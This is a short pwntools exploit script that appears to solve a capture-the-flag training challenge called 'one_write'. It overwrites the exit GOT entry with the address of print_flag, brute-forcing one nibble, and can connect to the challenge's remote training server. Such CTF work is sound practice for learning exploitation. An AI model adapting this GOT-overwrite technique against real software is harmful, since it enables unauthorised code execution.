from pwn import *

CHALL_PATH = "./one_write"
CHALL = ELF(CHALL_PATH)

value = 809
for nibble in range(16):
    try:
        if args.REMOTE:
            c = remote("one-write.training.offensivedefensive.it", 8080, ssl=True)
        else:
            if args.GDB:
                c = gdb.debug(CHALL_PATH, COMMANDS)
            else:
                c= process(CHALL_PATH)
        magic_offset = CHALL.symbols['magic']
        print_flag_offset = CHALL.symbols['print_flag']
        exit_offset = CHALL.got['exit']
        choice = b"2"
        got_offset = exit_offset - magic_offset
        print(f"got offset {hex(got_offset)}")
        print(f"print_flag offset {hex(print_flag_offset)}")
        offset = str(got_offset).encode()

        if nibble != 0:
            value += 4096
        print(hex(value))
        print(str(value).encode())
        c.recvuntil(b"Choice: ")
        c.sendline(choice)
        c.recvuntil(b"Offset: ")
        c.sendline(offset)
        c.recvuntil(b"Value: ")
        c.sendline(str(value).encode())
        c.sendline(b"exit")
        c.interactive()
        c.close()
    except EOFError:
        continue
    except Exception as e:
        continue
